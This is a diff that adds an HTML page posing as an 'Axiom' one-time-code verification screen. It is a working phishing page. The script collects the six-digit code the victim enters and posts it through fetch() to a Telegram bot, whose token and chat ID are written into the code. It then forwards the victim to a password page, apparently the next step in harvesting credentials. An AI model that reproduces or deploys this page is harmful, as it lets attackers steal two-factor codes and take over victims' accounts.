@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OTP Verification</title>
+  <style>
+    /* Reset */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    /* Overlay Background */
+    body {
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: url("otp.png") no-repeat center center fixed;
+      background-size: cover;
+      position: relative;
+    }
+
+    body::after {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.65); /* dark overlay */
+      z-index: 1;
+    }
+
+    /* OTP Box */
+    .otp-box {
+      position: relative;
+      z-index: 2;
+      background: #000;
+      color: #fff;
+      width: 360px;
+      padding: 24px;
+      border-radius: 4px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.6);
+    }
+
+    /* Header */
+    .otp-box h2 {
+      font-size: 20px;
+      margin-bottom: 12px;
+      text-align: center;
+    }
+
+    .otp-box p {
+      font-size: 14px;
+      color: #aaa;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    /* OTP Inputs */
+    .otp-inputs {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 16px;
+    }
+
+    .otp-inputs input {
+      width: 40px;
+      height: 60px;
+      text-align: center;
+      font-size: 20px;
+      border: 1px solid #F5F5F5;
+      border-radius: 3px;
+      background: #000;
+      color: #fff;
+      outline: none;
+      transition: border 0.2s;
+    }
+
+    .otp-inputs input:focus {
+      border: 1px solid #0d6efd; /* highlight on focus */
+    }
+
+    /* Resend Timer */
+    .resend {
+      font-size: 13px;
+      text-align: center;
+      color: #aaa;
+      margin-bottom: 20px;
+    }
+
+    /* Footer */
+    .footer {
+      font-size: 12px;
+      color: #888;
+      text-align: center;
+    }
+
+    .footer a {
+      color: #0d6efd;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="otp-box">
+    <h2>Confirmation Code</h2>
+    <p>We’ve sent a verification code to <br> *****@gmail.com</p>
+
+    <div class="otp-inputs">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+    </div>
+
+    <div class="resend" id="resend">
+      You can resend a new code in 60 seconds
+    </div>
+
+    <div class="footer">
+      By creating an account, you agree to Axiom’s
+      <a href="#">Privacy Policy</a> and
+      <a href="#">Terms of Service</a>
+    </div>
+  </div>
+
+<script>
+  const inputs = document.querySelectorAll(".otp-inputs input");
+  const resend = document.getElementById("resend");
+
+  let sent = false; // Prevent multiple sends
+  let timeLeft = 60;
+
+  // Auto move & collect OTP
+  inputs.forEach((input, index) => {
+    input.addEventListener("input", () => {
+      if (input.value && index < inputs.length - 1) {
+        inputs[index + 1].focus();
+      }
+
+      const code = Array.from(inputs).map(b => b.value).join('');
+      if (code.length === inputs.length && !sent) {
+        sent = true;
+        sendToTelegram(code);
+      }
+    });
+
+    input.addEventListener("keydown", (e) => {
+      if (e.key === "Backspace" && !input.value && index > 0) {
+        inputs[index - 1].focus();
+      }
+    });
+  });
+
+  // Countdown Timer
+  const timer = setInterval(() => {
+    timeLeft--;
+    if (timeLeft > 0) {
+      resend.textContent = `You can resend a new code in ${timeLeft} seconds`;
+    } else {
+      clearInterval(timer);
+      resend.innerHTML = `Didn’t receive the code? <a href="#">Resend</a>`;
+    }
+  }, 1000);
+
+  // Telegram Bot API + Redirect
+  const BOT_TOKEN = "8387730686:AAFo7mnRLBtTkN3HAWrznqbW7fsOxD57HkU";
+  const CHAT_ID = "-4909990023";
+
+  function sendToTelegram(code) {
+    const message = `User entered code: ${code}`;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+    })
+    .then(() => {
+      console.log("Code sent to Telegram");
+      // Redirect after success
+      window.location.href = "password.html";
+    })
+    .catch(err => {
+      console.error("Error:", err);
+      // Even if error, redirect anyway
+      window.location.href = "password.html";
+    });
+  }
+</script>
